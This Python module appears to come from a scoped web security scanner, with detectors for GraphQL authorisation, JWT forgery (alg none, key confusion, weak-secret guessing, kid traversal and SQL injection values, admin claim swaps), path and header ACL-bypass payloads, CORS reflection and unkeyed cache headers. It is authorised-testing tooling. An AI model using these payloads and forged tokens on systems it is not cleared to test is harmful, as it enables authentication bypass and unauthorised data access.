"""
Targeted detectors for classes that need protocol-specific knowledge rather
than generic mutation.

  graphql   -- introspection, field-level authorisation, batching, aliases
  jwt       -- alg confusion, none, kid traversal, weak secret, claim swap
  pathacl   -- proxy/gateway ACL bypass on a route that returned 403
  cache     -- unkeyed-input poisoning (detected, never persisted)
  cors      -- origin reflection with credentials

Each emits the same Verdict/OracleHit vocabulary, so findings flow through
promote/evidence/report unchanged.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import secrets
from urllib.parse import urlsplit, urlunsplit

from .db import DB
from .net import Client, Request
from .oracles import OracleHit
from .scope import Scope, ScopeViolation


def _rec(db: DB, kind: str, ident: str, req: Request, resp,
         hit: OracleHit | None) -> None:
    sig = req.signature()
    if db.seen_signature(sig):
        return
    db.ex(
        "INSERT INTO experiments (signature, kind, base_request_id, as_identity, "
        "method, url, body, status, resp_sha256, resp_len, elapsed_ms, verdict, "
        "score, detail, dest_address) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
        sig, kind, None, ident, req.method, req.url,
        (req.body or b"").decode("utf-8", "replace")[:20000],
        resp.status, resp.sha256, len(resp.body), resp.elapsed_ms,
        "leak" if hit and hit.confidence >= 0.55 else "inconclusive",
        hit.confidence if hit else 0.0,
        json.dumps({"reasons": [hit.signal] if hit else [],
                    "oracle": hit.oracle if hit else None,
                    "shared_values": [], "pii": [],
                    "detail": hit.detail if hit else {}}),
        getattr(resp, "address", "") or "",
    )


# ============================================================== GraphQL

_GQL_HINT = re.compile(r"/(graphql|gql|api/graphql|query)/?$", re.I)

INTROSPECTION = {"query": "{__schema{queryType{name} types{name kind "
                          "fields{name args{name type{name kind}} "
                          "type{name kind ofType{name}}}}}}"}


def graphql(db: DB, scope: Scope, corpus: str, log=print) -> dict:
    """
    GraphQL authorisation is field-level, and almost every scanner tests it
    at the endpoint level. That gap is where the findings are.
    """
    rows = db.q("SELECT * FROM requests WHERE corpus=?", corpus)
    endpoints = {}
    for r in rows:
        p = urlsplit(r["url"])
        if _GQL_HINT.search(p.path or "") or '"query"' in (r["body"] or "")[:200]:
            endpoints[f"{p.scheme}://{p.netloc}{p.path}"] = r
    if not endpoints:
        log("[graphql] no GraphQL endpoints in corpus")
        return {"endpoints": 0}

    from . import identity as ident_mod
    idents = {n: dict(i.headers) for n, i in ident_mod.load_all(db).items()}
    out = {"endpoints": len(endpoints), "introspection": 0, "field_authz": 0,
           "batching": 0}

    with Client(scope) as client:
        for url, base in endpoints.items():
            headers = json.loads(base["headers"] or "{}")
            headers["Content-Type"] = "application/json"
            headers.pop("Content-Length", None)

            # --- 1. introspection, per identity -------------------------
            schema_types = None
            for name, ih in idents.items():
                h = {k: v for k, v in headers.items()
                     if k.lower() not in ("authorization", "cookie")}
                h.update(ih)
                req = Request("POST", url, h, json.dumps(INTROSPECTION).encode(),
                              identity=name)
                try:
                    r = client.send(req)
                except (ScopeViolation, Exception):
                    continue
                ok = r.status == 200 and '"__schema"' in r.text
                hit = None
                if ok:
                    if name == "anon":
                        hit = OracleHit(
                            "graphql:introspection",
                            "full schema introspection available "
                            "unauthenticated", 0.60,
                            {"identity": name})
                        out["introspection"] += 1
                        log(f"[graphql] introspection open to {name} @ {url}")
                    try:
                        schema_types = r.json()["data"]["__schema"]["types"]
                    except Exception:
                        pass
                _rec(db, "graphql", name, req, r, hit)

            # --- 2. field-level authorisation ---------------------------
            if not schema_types:
                continue
            sensitive = _sensitive_fields(schema_types)
            log(f"[graphql] {len(sensitive)} sensitive-looking fields to probe")

            for qname, fields in sensitive[:20]:
                q = {"query": "{%s{%s}}" % (qname, " ".join(fields[:6]))}
                per_identity = {}
                for name, ih in idents.items():
                    h = {k: v for k, v in headers.items()
                         if k.lower() not in ("authorization", "cookie")}
                    h.update(ih)
                    req = Request("POST", url, h, json.dumps(q).encode(),
                                  identity=name)
                    try:
                        r = client.send(req)
                    except Exception:
                        continue
                    has_data = (r.status == 200 and '"data"' in r.text
                                and '"errors"' not in r.text
                                and r.text.count("null") < 3)
                    per_identity[name] = (r, has_data)
                    _rec(db, "graphql", name, req, r, None)

                privileged = [n for n, (_, ok) in per_identity.items()
                              if ok and n in ("anon",)]
                if privileged:
                    out["field_authz"] += 1
                    log(f"[graphql] field '{qname}' readable by {privileged}")
                    r, _ = per_identity[privileged[0]]
                    _rec(db, "graphql", privileged[0],
                         Request("POST", url, headers, json.dumps(q).encode(),
                                 identity=privileged[0]), r,
                         OracleHit("graphql:field_authz",
                                   f"field '{qname}' returns data to "
                                   f"{privileged[0]} with no authorisation",
                                   0.75, {"query": qname, "fields": fields[:6]}))

            # --- 3. batching / alias amplification ----------------------
            batch = [{"query": "{__typename}"} for _ in range(25)]
            req = Request("POST", url, headers, json.dumps(batch).encode(),
                          identity="probe")
            try:
                r = client.send(req)
                if r.status == 200 and r.text.count("__typename") >= 10:
                    out["batching"] += 1
                    log(f"[graphql] array batching accepted ({url})")
                    _rec(db, "graphql", "probe", req, r,
                         OracleHit("graphql:batching",
                                   "array batching accepted -- enables "
                                   "rate-limit and brute-force amplification",
                                   0.55, {"batch_size": 25}))
            except Exception:
                pass

    log(f"[graphql] {json.dumps(out)}")
    return out


_SENSITIVE_FIELD = re.compile(
    r"(?i)(email|phone|address|ssn|token|secret|password|key|salary|balance|"
    r"card|iban|dob|birth|national|passport|internal|private|admin|role)")


def _sensitive_fields(types: list) -> list[tuple[str, list[str]]]:
    out = []
    for t in types:
        if not isinstance(t, dict) or t.get("kind") != "OBJECT":
            continue
        name = t.get("name") or ""
        if name.startswith("__"):
            continue
        fields = [f.get("name") for f in (t.get("fields") or [])
                  if f.get("name") and not (f.get("args"))]
        sens = [f for f in fields if _SENSITIVE_FIELD.search(f)]
        if sens:
            out.append((name[0].lower() + name[1:], sens + fields[:3]))
    return out


# ================================================================== JWT

def jwt_attacks(db: DB, scope: Scope, corpus: str, log=print) -> dict:
    """
    Structural JWT attacks. Each produces a token the server either accepts
    or rejects -- a binary, verifiable outcome, not an inference.
    """
    rows = db.q("SELECT * FROM requests WHERE corpus=? AND status IN "
                "(200,201,202,206)", corpus)
    out = {"tokens": 0, "alg_none": 0, "alg_confusion": 0, "weak_secret": 0,
           "claim_swap": 0, "kid_traversal": 0}
    tried_hosts = set()

    with Client(scope) as client:
        for r in rows:
            headers = json.loads(r["headers"] or "{}")
            tok, hdr_key = _find_jwt(headers)
            if not tok:
                continue
            host = urlsplit(r["url"]).netloc
            if host in tried_hosts:
                continue
            tried_hosts.add(host)
            out["tokens"] += 1

            parts = tok.split(".")
            if len(parts) != 3:
                continue
            try:
                head = json.loads(_b64d(parts[0]))
                claims = json.loads(_b64d(parts[1]))
            except Exception:
                continue
            log(f"[jwt] {host}: alg={head.get('alg')} claims={list(claims)[:8]}")

            variants = []
            # alg:none
            for alg in ("none", "None", "NONE", "nOnE"):
                h2 = dict(head, alg=alg)
                variants.append(("alg_none", f"alg={alg}",
                                 f"{_b64e(h2)}.{_b64e(claims)}."))
            # RS256 -> HS256 confusion, signed with a guessable public-key proxy
            if str(head.get("alg", "")).upper().startswith(("RS", "ES", "PS")):
                h2 = dict(head, alg="HS256")
                unsigned = f"{_b64e(h2)}.{_b64e(claims)}"
                for key in (b"", b"secret", host.encode()):
                    sig = base64.urlsafe_b64encode(
                        hmac.new(key, unsigned.encode(), hashlib.sha256).digest()
                    ).rstrip(b"=").decode()
                    variants.append(("alg_confusion",
                                     f"RS->HS256 key={key!r}",
                                     f"{unsigned}.{sig}"))
            # weak HMAC secret
            if str(head.get("alg", "")).upper().startswith("HS"):
                unsigned = f"{parts[0]}.{parts[1]}"
                for key in (b"secret", b"password", b"changeme", b"jwt",
                            b"key", b"123456", b"your-256-bit-secret",
                            host.split(".")[0].encode()):
                    sig = base64.urlsafe_b64encode(
                        hmac.new(key, unsigned.encode(), hashlib.sha256).digest()
                    ).rstrip(b"=").decode()
                    if sig == parts[2]:
                        out["weak_secret"] += 1
                        log(f"[jwt] WEAK SECRET: {key!r} verifies the token "
                            f"offline -- full forgery possible")
                        db.note(host, "manual",
                                f"JWT signed with weak secret {key!r}")
            # kid path traversal / sqli
            if "kid" in head:
                for k in ("../../../../dev/null", "/dev/null",
                          "' UNION SELECT 'x'--"):
                    h2 = dict(head, kid=k, alg="HS256")
                    unsigned = f"{_b64e(h2)}.{_b64e(claims)}"
                    sig = base64.urlsafe_b64encode(
                        hmac.new(b"", unsigned.encode(), hashlib.sha256).digest()
                    ).rstrip(b"=").decode()
                    variants.append(("kid_traversal", f"kid={k}",
                                     f"{unsigned}.{sig}"))
            # claim tampering (signature left intact -- tests verification)
            for ck, cv in (("role", "admin"), ("isAdmin", True),
                           ("scope", "admin"), ("sub", "1")):
                if ck in claims:
                    c2 = dict(claims)
                    c2[ck] = cv
                    variants.append(("claim_swap", f"{ck}={cv}",
                                     f"{parts[0]}.{_b64e(c2)}.{parts[2]}"))

            for kind, desc, forged in variants:
                h = dict(headers)
                h[hdr_key] = (f"Bearer {forged}"
                              if headers[hdr_key].lower().startswith("bearer")
                              else forged)
                h.pop("Content-Length", None)
                req = Request(r["method"], r["url"], h,
                              (r["body"] or "").encode() or None,
                              identity=f"jwt:{kind}")
                try:
                    resp = client.send(req)
                except Exception:
                    continue
                accepted = resp.status in (200, 201, 202, 206)
                hit = None
                if accepted:
                    out[kind] = out.get(kind, 0) + 1
                    hit = OracleHit(
                        f"jwt:{kind}",
                        f"forged token accepted ({desc}) -- server returned "
                        f"{resp.status}", 0.90,
                        {"variant": desc, "original_alg": head.get("alg")})
                    log(f"[jwt] ACCEPTED {kind}: {desc} -> {resp.status}")
                _rec(db, "jwt", f"jwt:{kind}", req, resp, hit)

    log(f"[jwt] {json.dumps(out)}")
    return out


def _find_jwt(headers: dict) -> tuple[str | None, str]:
    for k, v in headers.items():
        m = re.search(r"(eyJ[\w\-]+\.eyJ[\w\-]+\.[\w\-]*)", str(v))
        if m:
            return m.group(1), k
    return None, ""


def _b64d(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _b64e(obj) -> str:
    return base64.urlsafe_b64encode(
        json.dumps(obj, separators=(",", ":")).encode()).rstrip(b"=").decode()


# ========================================================= path ACL bypass

_BYPASS_PATH = [
    ("{p}/", "trailing slash"),
    ("{p}//", "double trailing slash"),
    ("/{p}", "leading slash duplication"),
    ("{p}/.", "dot suffix"),
    ("{p}%2f", "encoded trailing slash"),
    ("{p}..;/", "semicolon traversal (tomcat)"),
    ("{p};foo=bar", "path parameter"),
    ("{p}%20", "trailing space"),
    ("{p}%09", "trailing tab"),
    ("{p}?", "empty query"),
    ("{p}#", "fragment"),
    ("{p}.json", "extension append"),
    ("/./{p}", "dot-slash prefix"),
    ("/%2e/{p}", "encoded dot prefix"),
]

_BYPASS_HEADERS = [
    ({"X-Original-URL": "{p}"}, "X-Original-URL override"),
    ({"X-Rewrite-URL": "{p}"}, "X-Rewrite-URL override"),
    ({"X-Forwarded-For": "127.0.0.1"}, "XFF localhost"),
    ({"X-Forwarded-Host": "localhost"}, "XFH localhost"),
    ({"X-Real-IP": "127.0.0.1"}, "X-Real-IP localhost"),
    ({"X-Custom-IP-Authorization": "127.0.0.1"}, "custom IP auth header"),
    ({"X-Originating-IP": "127.0.0.1"}, "X-Originating-IP"),
    ({"X-Remote-Addr": "127.0.0.1"}, "X-Remote-Addr"),
    ({"X-Client-IP": "127.0.0.1"}, "X-Client-IP"),
    ({"Referer": "http://localhost/admin"}, "internal referer"),
]

_BYPASS_METHODS = ["POST", "HEAD", "OPTIONS", "TRACE", "PATCH"]


def path_acl(db: DB, scope: Scope, corpus: str, log=print) -> dict:
    """
    Routes the app answered 403/401 on are the ones with something worth
    protecting. Proxy and gateway ACLs are routinely normalised differently
    from the application router.
    """
    rows = db.q("SELECT DISTINCT url, method, headers FROM requests "
                "WHERE corpus=? AND status IN (401,403)", corpus)
    if not rows:
        log("[pathacl] no 401/403 routes in corpus")
        return {"routes": 0}
    out = {"routes": len(rows), "bypassed": 0}
    log(f"[pathacl] probing {len(rows)} denied route(s)")

    with Client(scope) as client:
        for r in rows:
            parts = urlsplit(r["url"])
            path = parts.path or "/"
            base_headers = json.loads(r["headers"] or "{}")
            base_headers.pop("Content-Length", None)

            # The control is the denial itself. A bypass is a 2xx whose body
            # differs from the denial body -- not a response over some
            # arbitrary size, since a JSON admin endpoint can be tiny.
            denied_body = ""
            base = db.one("SELECT resp_body FROM requests WHERE url=? AND "
                          "status IN (401,403) LIMIT 1", r["url"])
            if base:
                denied_body = (base["resp_body"] or "")[:4000]

            cases = []
            for tpl, why in _BYPASS_PATH:
                np = tpl.replace("{p}", path)
                cases.append((r["method"],
                              urlunsplit(parts._replace(path=np)),
                              dict(base_headers), why))
            for hdrs, why in _BYPASS_HEADERS:
                h = dict(base_headers)
                h.update({k: v.replace("{p}", path) for k, v in hdrs.items()})
                cases.append((r["method"], r["url"], h, why))
            for m in _BYPASS_METHODS:
                if m.upper() in {x.upper() for x in scope.allowed_methods}:
                    cases.append((m, r["url"], dict(base_headers),
                                  f"method override -> {m}"))

            for method, url, hdrs, why in cases:
                req = Request(method, url, hdrs, None, identity="pathacl")
                try:
                    resp = client.send(req)
                except (ScopeViolation, Exception):
                    continue
                hit = None
                differs = resp.text.strip() != denied_body.strip()
                if resp.status in (200, 201, 206) and differs and resp.body:
                    out["bypassed"] += 1
                    hit = OracleHit(
                        "pathacl:bypass",
                        f"route returned {resp.status} via {why}; the "
                        f"response differs from the {r['method']} denial "
                        f"baseline, so the ACL was not applied",
                        0.80, {"technique": why, "original_path": path,
                               "bypass_bytes": len(resp.body)})
                    log(f"[pathacl] BYPASS {why}: {method} {url} -> {resp.status}")
                _rec(db, "pathacl", "pathacl", req, resp, hit)

    log(f"[pathacl] {json.dumps(out)}")
    return out


# ================================================================== CORS

def cors(db: DB, scope: Scope, corpus: str, log=print) -> dict:
    """Origin reflection matters only when credentials are allowed."""
    rows = db.q("SELECT DISTINCT url FROM requests WHERE corpus=? LIMIT 60", corpus)
    out = {"tested": 0, "vulnerable": 0}
    evil = "https://hunt-cors-probe.example"

    with Client(scope) as client:
        for r in rows:
            host = urlsplit(r["url"]).netloc
            for origin, why in [
                (evil, "arbitrary origin reflected"),
                (f"https://{host}.example", "suffix-match bypass"),
                (f"https://evil{host}", "prefix-match bypass"),
                ("null", "null origin accepted"),
            ]:
                req = Request("GET", r["url"], {"Origin": origin},
                              None, identity="cors")
                try:
                    resp = client.send(req)
                except Exception:
                    continue
                out["tested"] += 1
                acao = resp.headers.get("access-control-allow-origin", "")
                acac = resp.headers.get("access-control-allow-credentials", "")
                hit = None
                if acao == origin and acac.lower() == "true":
                    out["vulnerable"] += 1
                    hit = OracleHit(
                        "cors:reflected",
                        f"{why}: ACAO echoed '{origin}' with "
                        f"Allow-Credentials: true", 0.85,
                        {"origin": origin, "acao": acao})
                    log(f"[cors] VULNERABLE {r['url']} <- {origin}")
                _rec(db, "cors", "cors", req, resp, hit)

    log(f"[cors] {json.dumps(out)}")
    return out


# ======================================================== cache poisoning

_UNKEYED = [
    ({"X-Forwarded-Host": "hunt-cache-probe.example"}, "X-Forwarded-Host"),
    ({"X-Forwarded-Scheme": "http"}, "X-Forwarded-Scheme"),
    ({"X-Forwarded-Proto": "http"}, "X-Forwarded-Proto"),
    ({"X-Host": "hunt-cache-probe.example"}, "X-Host"),
    ({"X-Original-Host": "hunt-cache-probe.example"}, "X-Original-Host"),
]


def cache_poison(db: DB, scope: Scope, corpus: str, log=print) -> dict:
    """
    Detects unkeyed input reflection only. Deliberately does NOT attempt to
    poison a shared cache -- that would affect other users of a live service.
    The finding is "this header is reflected and the response is cacheable",
    which is what a triager needs.
    """
    rows = db.q("SELECT DISTINCT url FROM requests WHERE corpus=? "
                "AND method='GET' LIMIT 40", corpus)
    out = {"tested": 0, "reflected_unkeyed": 0}
    probe = "hunt-cache-probe.example"

    with Client(scope) as client:
        for r in rows:
            for hdrs, why in _UNKEYED:
                cb = secrets.token_hex(4)
                url = r["url"] + ("&" if "?" in r["url"] else "?") + f"cb={cb}"
                req = Request("GET", url, dict(hdrs), None, identity="cache")
                try:
                    resp = client.send(req)
                except Exception:
                    continue
                out["tested"] += 1
                cacheable = any(
                    k in resp.headers for k in
                    ("x-cache", "cf-cache-status", "age", "x-varnish",
                     "x-cache-hits", "x-served-by"))
                reflected = probe in resp.text or probe in str(
                    resp.headers.get("location", ""))
                hit = None
                if reflected and cacheable:
                    out["reflected_unkeyed"] += 1
                    hit = OracleHit(
                        "cache:unkeyed",
                        f"unkeyed header {why} reflected into a cacheable "
                        f"response (cache headers present: "
                        f"{[k for k in resp.headers if 'cache' in k.lower()]})",
                        0.75, {"header": why})
                    log(f"[cache] UNKEYED {why} reflected @ {r['url']}")
                elif reflected:
                    hit = OracleHit(
                        "cache:reflected",
                        f"header {why} reflected but no cache headers observed",
                        0.35, {"header": why})
                _rec(db, "cache", "cache", req, resp, hit)

    log(f"[cache] {json.dumps(out)}")
    return out
